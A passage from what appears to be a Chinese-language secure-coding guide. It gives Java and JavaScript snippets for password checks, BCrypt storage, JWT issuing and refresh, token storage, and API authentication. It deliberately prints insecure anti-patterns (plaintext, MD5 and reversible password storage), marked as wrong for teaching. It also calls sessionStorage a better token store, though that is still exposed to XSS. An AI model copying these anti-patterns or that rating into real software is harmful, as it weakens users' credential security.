</span><span id="__span-141-40"><a id="__codelineno-141-40" name="__codelineno-141-40" href="#__codelineno-141-40"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ValidationResult</span><span class="p">(</span><span class="n">errors</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(),</span><span class="w"> </span><span class="n">errors</span><span class="p">);</span>
</span><span id="__span-141-41"><a id="__codelineno-141-41" name="__codelineno-141-41" href="#__codelineno-141-41"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-141-42"><a id="__codelineno-141-42" name="__codelineno-141-42" href="#__codelineno-141-42"></a>
</span><span id="__span-141-43"><a id="__codelineno-141-43" name="__codelineno-141-43" href="#__codelineno-141-43"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isCommonPassword</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-141-44"><a id="__codelineno-141-44" name="__codelineno-141-44" href="#__codelineno-141-44"></a><span class="w">        </span><span class="n">Set</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">commonPasswords</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Set</span><span class="p">.</span><span class="na">of</span><span class="p">(</span>
</span><span id="__span-141-45"><a id="__codelineno-141-45" name="__codelineno-141-45" href="#__codelineno-141-45"></a><span class="w">            </span><span class="s">&quot;password&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;123456&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;12345678&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;qwerty&quot;</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-141-46"><a id="__codelineno-141-46" name="__codelineno-141-46" href="#__codelineno-141-46"></a><span class="w">            </span><span class="s">&quot;abc123&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;password123&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;admin&quot;</span>
</span><span id="__span-141-47"><a id="__codelineno-141-47" name="__codelineno-141-47" href="#__codelineno-141-47"></a><span class="w">        </span><span class="p">);</span>
</span><span id="__span-141-48"><a id="__codelineno-141-48" name="__codelineno-141-48" href="#__codelineno-141-48"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">commonPasswords</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">());</span>
</span><span id="__span-141-49"><a id="__codelineno-141-49" name="__codelineno-141-49" href="#__codelineno-141-49"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-141-50"><a id="__codelineno-141-50" name="__codelineno-141-50" href="#__codelineno-141-50"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>密码存储：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-142-1"><a id="__codelineno-142-1" name="__codelineno-142-1" href="#__codelineno-142-1"></a><span class="c1">// ✅ 正确：使用BCrypt/Argon2</span>
</span><span id="__span-142-2"><a id="__codelineno-142-2" name="__codelineno-142-2" href="#__codelineno-142-2"></a><span class="n">String</span><span class="w"> </span><span class="n">hashedPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BCrypt</span><span class="p">.</span><span class="na">hashpw</span><span class="p">(</span><span class="n">plainPassword</span><span class="p">,</span><span class="w"> </span><span class="n">BCrypt</span><span class="p">.</span><span class="na">gensalt</span><span class="p">(</span><span class="mi">12</span><span class="p">));</span>
</span><span id="__span-142-3"><a id="__codelineno-142-3" name="__codelineno-142-3" href="#__codelineno-142-3"></a>
</span><span id="__span-142-4"><a id="__codelineno-142-4" name="__codelineno-142-4" href="#__codelineno-142-4"></a><span class="c1">// ❌ 错误：明文存储</span>
</span><span id="__span-142-5"><a id="__codelineno-142-5" name="__codelineno-142-5" href="#__codelineno-142-5"></a><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;myPassword123&quot;</span><span class="p">;</span>
</span><span id="__span-142-6"><a id="__codelineno-142-6" name="__codelineno-142-6" href="#__codelineno-142-6"></a>
</span><span id="__span-142-7"><a id="__codelineno-142-7" name="__codelineno-142-7" href="#__codelineno-142-7"></a><span class="c1">// ❌ 错误：简单哈希（MD5/SHA-256）</span>
</span><span id="__span-142-8"><a id="__codelineno-142-8" name="__codelineno-142-8" href="#__codelineno-142-8"></a><span class="n">String</span><span class="w"> </span><span class="n">md5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DigestUtils</span><span class="p">.</span><span class="na">md5Hex</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
</span><span id="__span-142-9"><a id="__codelineno-142-9" name="__codelineno-142-9" href="#__codelineno-142-9"></a>
</span><span id="__span-142-10"><a id="__codelineno-142-10" name="__codelineno-142-10" href="#__codelineno-142-10"></a><span class="c1">// ❌ 错误：可逆加密</span>
</span><span id="__span-142-11"><a id="__codelineno-142-11" name="__codelineno-142-11" href="#__codelineno-142-11"></a><span class="n">String</span><span class="w"> </span><span class="n">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AES</span><span class="p">.</span><span class="na">encrypt</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">secretKey</span><span class="p">);</span>
</span></code></pre></div></p>
<h3 id="2-token安全">2. Token安全<a class="headerlink" href="#2-token安全" title="链接到此标题">&para;</a></h3>
<p><strong>JWT最佳实践：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-143-1"><a id="__codelineno-143-1" name="__codelineno-143-1" href="#__codelineno-143-1"></a><span class="cm">/**</span>
</span><span id="__span-143-2"><a id="__codelineno-143-2" name="__codelineno-143-2" href="#__codelineno-143-2"></a><span class="cm"> * JWT Token生成和验证</span>
</span><span id="__span-143-3"><a id="__codelineno-143-3" name="__codelineno-143-3" href="#__codelineno-143-3"></a><span class="cm"> */</span>
</span><span id="__span-143-4"><a id="__codelineno-143-4" name="__codelineno-143-4" href="#__codelineno-143-4"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JWTService</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-5"><a id="__codelineno-143-5" name="__codelineno-143-5" href="#__codelineno-143-5"></a>
</span><span id="__span-143-6"><a id="__codelineno-143-6" name="__codelineno-143-6" href="#__codelineno-143-6"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">SECRET_KEY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">getenv</span><span class="p">(</span><span class="s">&quot;JWT_SECRET&quot;</span><span class="p">);</span>
</span><span id="__span-143-7"><a id="__codelineno-143-7" name="__codelineno-143-7" href="#__codelineno-143-7"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">EXPIRATION_TIME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3600000</span><span class="p">;</span><span class="w"> </span><span class="c1">// 1小时</span>
</span><span id="__span-143-8"><a id="__codelineno-143-8" name="__codelineno-143-8" href="#__codelineno-143-8"></a>
</span><span id="__span-143-9"><a id="__codelineno-143-9" name="__codelineno-143-9" href="#__codelineno-143-9"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-143-10"><a id="__codelineno-143-10" name="__codelineno-143-10" href="#__codelineno-143-10"></a><span class="cm">     * 生成Token</span>
</span><span id="__span-143-11"><a id="__codelineno-143-11" name="__codelineno-143-11" href="#__codelineno-143-11"></a><span class="cm">     */</span>
</span><span id="__span-143-12"><a id="__codelineno-143-12" name="__codelineno-143-12" href="#__codelineno-143-12"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">generateToken</span><span class="p">(</span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-13"><a id="__codelineno-143-13" name="__codelineno-143-13" href="#__codelineno-143-13"></a><span class="w">        </span><span class="n">Date</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Date</span><span class="p">();</span>
</span><span id="__span-143-14"><a id="__codelineno-143-14" name="__codelineno-143-14" href="#__codelineno-143-14"></a><span class="w">        </span><span class="n">Date</span><span class="w"> </span><span class="n">expiry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Date</span><span class="p">(</span><span class="n">now</span><span class="p">.</span><span class="na">getTime</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">EXPIRATION_TIME</span><span class="p">);</span>
</span><span id="__span-143-15"><a id="__codelineno-143-15" name="__codelineno-143-15" href="#__codelineno-143-15"></a>
</span><span id="__span-143-16"><a id="__codelineno-143-16" name="__codelineno-143-16" href="#__codelineno-143-16"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">builder</span><span class="p">()</span>
</span><span id="__span-143-17"><a id="__codelineno-143-17" name="__codelineno-143-17" href="#__codelineno-143-17"></a><span class="w">            </span><span class="p">.</span><span class="na">setSubject</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="na">getUsername</span><span class="p">())</span>
</span><span id="__span-143-18"><a id="__codelineno-143-18" name="__codelineno-143-18" href="#__codelineno-143-18"></a><span class="w">            </span><span class="p">.</span><span class="na">setIssuedAt</span><span class="p">(</span><span class="n">now</span><span class="p">)</span>
</span><span id="__span-143-19"><a id="__codelineno-143-19" name="__codelineno-143-19" href="#__codelineno-143-19"></a><span class="w">            </span><span class="p">.</span><span class="na">setExpiration</span><span class="p">(</span><span class="n">expiry</span><span class="p">)</span>
</span><span id="__span-143-20"><a id="__codelineno-143-20" name="__codelineno-143-20" href="#__codelineno-143-20"></a><span class="w">            </span><span class="p">.</span><span class="na">claim</span><span class="p">(</span><span class="s">&quot;userId&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="na">getId</span><span class="p">())</span>
</span><span id="__span-143-21"><a id="__codelineno-143-21" name="__codelineno-143-21" href="#__codelineno-143-21"></a><span class="w">            </span><span class="p">.</span><span class="na">claim</span><span class="p">(</span><span class="s">&quot;roles&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="na">getRoles</span><span class="p">())</span>
</span><span id="__span-143-22"><a id="__codelineno-143-22" name="__codelineno-143-22" href="#__codelineno-143-22"></a><span class="w">            </span><span class="c1">// 使用强算法</span>
</span><span id="__span-143-23"><a id="__codelineno-143-23" name="__codelineno-143-23" href="#__codelineno-143-23"></a><span class="w">            </span><span class="p">.</span><span class="na">signWith</span><span class="p">(</span><span class="n">SignatureAlgorithm</span><span class="p">.</span><span class="na">HS512</span><span class="p">,</span><span class="w"> </span><span class="n">SECRET_KEY</span><span class="p">)</span>
</span><span id="__span-143-24"><a id="__codelineno-143-24" name="__codelineno-143-24" href="#__codelineno-143-24"></a><span class="w">            </span><span class="p">.</span><span class="na">compact</span><span class="p">();</span>
</span><span id="__span-143-25"><a id="__codelineno-143-25" name="__codelineno-143-25" href="#__codelineno-143-25"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-143-26"><a id="__codelineno-143-26" name="__codelineno-143-26" href="#__codelineno-143-26"></a>
</span><span id="__span-143-27"><a id="__codelineno-143-27" name="__codelineno-143-27" href="#__codelineno-143-27"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-143-28"><a id="__codelineno-143-28" name="__codelineno-143-28" href="#__codelineno-143-28"></a><span class="cm">     * 验证Token</span>
</span><span id="__span-143-29"><a id="__codelineno-143-29" name="__codelineno-143-29" href="#__codelineno-143-29"></a><span class="cm">     */</span>
</span><span id="__span-143-30"><a id="__codelineno-143-30" name="__codelineno-143-30" href="#__codelineno-143-30"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Claims</span><span class="w"> </span><span class="nf">validateToken</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-31"><a id="__codelineno-143-31" name="__codelineno-143-31" href="#__codelineno-143-31"></a><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-32"><a id="__codelineno-143-32" name="__codelineno-143-32" href="#__codelineno-143-32"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">parser</span><span class="p">()</span>
</span><span id="__span-143-33"><a id="__codelineno-143-33" name="__codelineno-143-33" href="#__codelineno-143-33"></a><span class="w">                </span><span class="p">.</span><span class="na">setSigningKey</span><span class="p">(</span><span class="n">SECRET_KEY</span><span class="p">)</span>
</span><span id="__span-143-34"><a id="__codelineno-143-34" name="__codelineno-143-34" href="#__codelineno-143-34"></a><span class="w">                </span><span class="p">.</span><span class="na">parseClaimsJws</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span><span id="__span-143-35"><a id="__codelineno-143-35" name="__codelineno-143-35" href="#__codelineno-143-35"></a><span class="w">                </span><span class="p">.</span><span class="na">getBody</span><span class="p">();</span>
</span><span id="__span-143-36"><a id="__codelineno-143-36" name="__codelineno-143-36" href="#__codelineno-143-36"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ExpiredJwtException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-37"><a id="__codelineno-143-37" name="__codelineno-143-37" href="#__codelineno-143-37"></a><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TokenExpiredException</span><span class="p">(</span><span class="s">&quot;Token已过期&quot;</span><span class="p">);</span>
</span><span id="__span-143-38"><a id="__codelineno-143-38" name="__codelineno-143-38" href="#__codelineno-143-38"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">JwtException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-39"><a id="__codelineno-143-39" name="__codelineno-143-39" href="#__codelineno-143-39"></a><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidTokenException</span><span class="p">(</span><span class="s">&quot;无效的Token&quot;</span><span class="p">);</span>
</span><span id="__span-143-40"><a id="__codelineno-143-40" name="__codelineno-143-40" href="#__codelineno-143-40"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-143-41"><a id="__codelineno-143-41" name="__codelineno-143-41" href="#__codelineno-143-41"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-143-42"><a id="__codelineno-143-42" name="__codelineno-143-42" href="#__codelineno-143-42"></a>
</span><span id="__span-143-43"><a id="__codelineno-143-43" name="__codelineno-143-43" href="#__codelineno-143-43"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-143-44"><a id="__codelineno-143-44" name="__codelineno-143-44" href="#__codelineno-143-44"></a><span class="cm">     * Token刷新策略</span>
</span><span id="__span-143-45"><a id="__codelineno-143-45" name="__codelineno-143-45" href="#__codelineno-143-45"></a><span class="cm">     */</span>
</span><span id="__span-143-46"><a id="__codelineno-143-46" name="__codelineno-143-46" href="#__codelineno-143-46"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">refreshToken</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">oldToken</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-47"><a id="__codelineno-143-47" name="__codelineno-143-47" href="#__codelineno-143-47"></a><span class="w">        </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">validateToken</span><span class="p">(</span><span class="n">oldToken</span><span class="p">);</span>
</span><span id="__span-143-48"><a id="__codelineno-143-48" name="__codelineno-143-48" href="#__codelineno-143-48"></a>
</span><span id="__span-143-49"><a id="__codelineno-143-49" name="__codelineno-143-49" href="#__codelineno-143-49"></a><span class="w">        </span><span class="c1">// 检查是否在刷新窗口内（例如：过期前15分钟）</span>
</span><span id="__span-143-50"><a id="__codelineno-143-50" name="__codelineno-143-50" href="#__codelineno-143-50"></a><span class="w">        </span><span class="n">Date</span><span class="w"> </span><span class="n">expiration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">getExpiration</span><span class="p">();</span>
</span><span id="__span-143-51"><a id="__codelineno-143-51" name="__codelineno-143-51" href="#__codelineno-143-51"></a><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">timeUntilExpiry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">expiration</span><span class="p">.</span><span class="na">getTime</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">currentTimeMillis</span><span class="p">();</span>
</span><span id="__span-143-52"><a id="__codelineno-143-52" name="__codelineno-143-52" href="#__codelineno-143-52"></a>
</span><span id="__span-143-53"><a id="__codelineno-143-53" name="__codelineno-143-53" href="#__codelineno-143-53"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">timeUntilExpiry</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">900000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 15分钟</span>
</span><span id="__span-143-54"><a id="__codelineno-143-54" name="__codelineno-143-54" href="#__codelineno-143-54"></a><span class="w">            </span><span class="c1">// 生成新Token</span>
</span><span id="__span-143-55"><a id="__codelineno-143-55" name="__codelineno-143-55" href="#__codelineno-143-55"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">generateToken</span><span class="p">(</span><span class="n">loadUserFromClaims</span><span class="p">(</span><span class="n">claims</span><span class="p">));</span>
</span><span id="__span-143-56"><a id="__codelineno-143-56" name="__codelineno-143-56" href="#__codelineno-143-56"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-143-57"><a id="__codelineno-143-57" name="__codelineno-143-57" href="#__codelineno-143-57"></a>
</span><span id="__span-143-58"><a id="__codelineno-143-58" name="__codelineno-143-58" href="#__codelineno-143-58"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">oldToken</span><span class="p">;</span>
</span><span id="__span-143-59"><a id="__codelineno-143-59" name="__codelineno-143-59" href="#__codelineno-143-59"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-143-60"><a id="__codelineno-143-60" name="__codelineno-143-60" href="#__codelineno-143-60"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>Token存储：</strong>
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-144-1"><a id="__codelineno-144-1" name="__codelineno-144-1" href="#__codelineno-144-1"></a><span class="c1">// ✅ 浏览器端推荐：HttpOnly Cookie</span>
</span><span id="__span-144-2"><a id="__codelineno-144-2" name="__codelineno-144-2" href="#__codelineno-144-2"></a><span class="c1">// 服务器设置：</span>
</span><span id="__span-144-3"><a id="__codelineno-144-3" name="__codelineno-144-3" href="#__codelineno-144-3"></a><span class="nx">response</span><span class="p">.</span><span class="nx">addCookie</span><span class="p">(</span><span class="nx">createSecureCookie</span><span class="p">(</span><span class="s2">&quot;token&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">jwtToken</span><span class="p">));</span>
</span><span id="__span-144-4"><a id="__codelineno-144-4" name="__codelineno-144-4" href="#__codelineno-144-4"></a>
</span><span id="__span-144-5"><a id="__codelineno-144-5" name="__codelineno-144-5" href="#__codelineno-144-5"></a><span class="c1">// ⚠️ 备选：LocalStorage（容易受XSS攻击）</span>
</span><span id="__span-144-6"><a id="__codelineno-144-6" name="__codelineno-144-6" href="#__codelineno-144-6"></a><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">jwtToken</span><span class="p">);</span>
</span><span id="__span-144-7"><a id="__codelineno-144-7" name="__codelineno-144-7" href="#__codelineno-144-7"></a>
</span><span id="__span-144-8"><a id="__codelineno-144-8" name="__codelineno-144-8" href="#__codelineno-144-8"></a><span class="c1">// ✅ 更好：使用sessionStorage（关闭标签后清除）</span>
</span><span id="__span-144-9"><a id="__codelineno-144-9" name="__codelineno-144-9" href="#__codelineno-144-9"></a><span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">jwtToken</span><span class="p">);</span>
</span><span id="__span-144-10"><a id="__codelineno-144-10" name="__codelineno-144-10" href="#__codelineno-144-10"></a>
</span><span id="__span-144-11"><a id="__codelineno-144-11" name="__codelineno-144-11" href="#__codelineno-144-11"></a><span class="c1">// ✅ 移动端：使用安全存储</span>
</span><span id="__span-144-12"><a id="__codelineno-144-12" name="__codelineno-144-12" href="#__codelineno-144-12"></a><span class="c1">// Android: EncryptedSharedPreferences</span>
</span><span id="__span-144-13"><a id="__codelineno-144-13" name="__codelineno-144-13" href="#__codelineno-144-13"></a><span class="c1">// iOS: Keychain</span>
</span></code></pre></div></p>
<h3 id="3-api安全">3. API安全<a class="headerlink" href="#3-api安全" title="链接到此标题">&para;</a></h3>
<p><strong>认证：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-145-1"><a id="__codelineno-145-1" name="__codelineno-145-1" href="#__codelineno-145-1"></a><span class="c1">// 1. Bearer Token认证</span>
</span><span id="__span-145-2"><a id="__codelineno-145-2" name="__codelineno-145-2" href="#__codelineno-145-2"></a><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&quot;/api/users/me&quot;</span><span class="p">)</span>
</span><span id="__span-145-3"><a id="__codelineno-145-3" name="__codelineno-145-3" href="#__codelineno-145-3"></a><span class="kd">public</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="nf">getCurrentUser</span><span class="p">(</span>
</span><span id="__span-145-4"><a id="__codelineno-145-4" name="__codelineno-145-4" href="#__codelineno-145-4"></a><span class="w">    </span><span class="nd">@RequestHeader</span><span class="p">(</span><span class="s">&quot;Authorization&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">authHeader</span>
</span><span id="__span-145-5"><a id="__codelineno-145-5" name="__codelineno-145-5" href="#__codelineno-145-5"></a><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-145-6"><a id="__codelineno-145-6" name="__codelineno-145-6" href="#__codelineno-145-6"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authHeader</span><span class="p">.</span><span class="na">replace</span><span class="p">(</span><span class="s">&quot;Bearer &quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">);</span>
</span><span id="__span-145-7"><a id="__codelineno-145-7" name="__codelineno-145-7" href="#__codelineno-145-7"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">userService</span><span class="p">.</span><span class="na">getUserFromToken</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span><span id="__span-145-8"><a id="__codelineno-145-8" name="__codelineno-145-8" href="#__codelineno-145-8"></a><span class="p">}</span>
</span><span id="__span-145-9"><a id="__codelineno-145-9" name="__codelineno-145-9" href="#__codelineno-145-9"></a>
</span><span id="__span-145-10"><a id="__codelineno-145-10" name="__codelineno-145-10" href="#__codelineno-145-10"></a><span class="c1">// 2. API Key认证（适用于服务间调用）</span>
</span><span id="__span-145-11"><a id="__codelineno-145-11" name="__codelineno-145-11" href="#__codelineno-145-11"></a><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&quot;/api/data&quot;</span><span class="p">)</span>
</span><span id="__span-145-12"><a id="__codelineno-145-12" name="__codelineno-145-12" href="#__codelineno-145-12"></a><span class="kd">public</span><span class="w"> </span><span class="n">Data</span><span class="w"> </span><span class="nf">getData</span><span class="p">(</span>
</span><span id="__span-145-13"><a id="__codelineno-145-13" name="__codelineno-145-13" href="#__codelineno-145-13"></a><span class="w">    </span><span class="nd">@RequestHeader</span><span class="p">(</span><span class="s">&quot;X-API-Key&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">apiKey</span>
</span><span id="__span-145-14"><a id="__codelineno-145-14" name="__codelineno-145-14" href="#__codelineno-145-14"></a><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-145-15"><a id="__codelineno-145-15" name="__codelineno-145-15" href="#__codelineno-145-15"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">apiKeyService</span><span class="p">.</span><span class="na">isValid</span><span class="p">(</span><span class="n">apiKey</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-145-16"><a id="__codelineno-145-16" name="__codelineno-145-16" href="#__codelineno-145-16"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnauthorizedException</span><span class="p">();</span>
</span><span id="__span-145-17"><a id="__codelineno-145-17" name="__codelineno-145-17" href="#__codelineno-145-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-145-18"><a id="__codelineno-145-18" name="__codelineno-145-18" href="#__codelineno-145-18"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">dataService</span><span class="p">.</span><span class="na">getData</span><span class="p">();</span>
</span><span id="__span-145-19"><a id="__codelineno-145-19" name="__codelineno-145-19" href="#__codelineno-145-19"></a><span class="p">}</span>
</span><span id="__span-145-20"><a id="__codelineno-145-20" name="__codelineno-145-20" href="#__codelineno-145-20"></a>
</span><span id="__span-145-21"><a id="__codelineno-145-21" name="__codelineno-145-21" href="#__codelineno-145-21"></a><span class="c1">// 3. 签名认证（高安全场景）</span>
</span><span id="__span-145-22"><a id="__codelineno-145-22" name="__codelineno-145-22" href="#__codelineno-145-22"></a><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/api/payment&quot;</span><span class="p">)</span>
</span><span id="__span-145-23"><a id="__codelineno-145-23" name="__codelineno-145-23" href="#__codelineno-145-23"></a><span class="kd">public</span><span class="w"> </span><span class="n">PaymentResult</span><span class="w"> </span><span class="nf">processPayment</span><span class="p">(</span>
</span><span id="__span-145-24"><a id="__codelineno-145-24" name="__codelineno-145-24" href="#__codelineno-145-24"></a><span class="w">    </span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">PaymentRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span>
</span><span id="__span-145-25"><a id="__codelineno-145-25" name="__codelineno-145-25" href="#__codelineno-145-25"></a><span class="w">    </span><span class="nd">@RequestHeader</span><span class="p">(</span><span class="s">&quot;X-Signature&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">signature</span><span class="p">,</span>
</span><span id="__span-145-26"><a id="__codelineno-145-26" name="__codelineno-145-26" href="#__codelineno-145-26"></a><span class="w">    </span><span class="nd">@RequestHeader</span><span class="p">(</span><span class="s">&quot;X-Timestamp&quot;</span><span class="p">)</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">timestamp</span>
</span><span id="__span-145-27"><a id="__codelineno-145-27" name="__codelineno-145-27" href="#__codelineno-145-27"></a><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-145-28"><a id="__codelineno-145-28" name="__codelineno-145-28" href="#__codelineno-145-28"></a><span class="w">    </span><span class="c1">// 验证时间戳（防重放攻击）</span>
</span><span id="__span-145-29"><a id="__codelineno-145-29" name="__codelineno-145-29" href="#__codelineno-145-29"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Math</span><span class="p">.</span><span class="na">abs</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">currentTimeMillis</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">timestamp</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">300000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-145-30"><a id="__codelineno-145-30" name="__codelineno-145-30" href="#__codelineno-145-30"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RequestExpiredException</span><span class="p">();</span>
</span><span id="__span-145-31"><a id="__codelineno-145-31" name="__codelineno-145-31" href="#__codelineno-145-31"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-145-32"><a id="__codelineno-145-32" name="__codelineno-145-32" href="#__codelineno-145-32"></a>
</span><span id="__span-145-33"><a id="__codelineno-145-33" name="__codelineno-145-33" href="#__codelineno-145-33"></a><span class="w">    </span><span class="c1">// 验证签名</span>
